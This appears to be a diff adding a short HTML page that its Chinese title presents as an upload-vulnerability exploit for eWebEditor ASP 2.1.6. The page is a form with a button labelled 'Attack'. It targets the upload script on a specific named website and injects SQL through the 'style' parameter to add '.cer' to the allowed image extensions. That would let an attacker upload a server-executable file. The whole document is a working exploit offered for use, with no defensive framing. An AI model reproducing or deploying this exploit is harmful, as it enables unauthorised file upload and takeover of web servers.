@@ -1,0 +1,5 @@
+<H1>ewebeditor asp版 2.1.6 上传漏洞利用程序----by  <a href=http://user.qzone.qq.com/522741305/infocenter>Xzz</a></H1><br><br>
+<form action="http://www.fpimc.cn/jms/edit/Upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=Attack>
+</form>
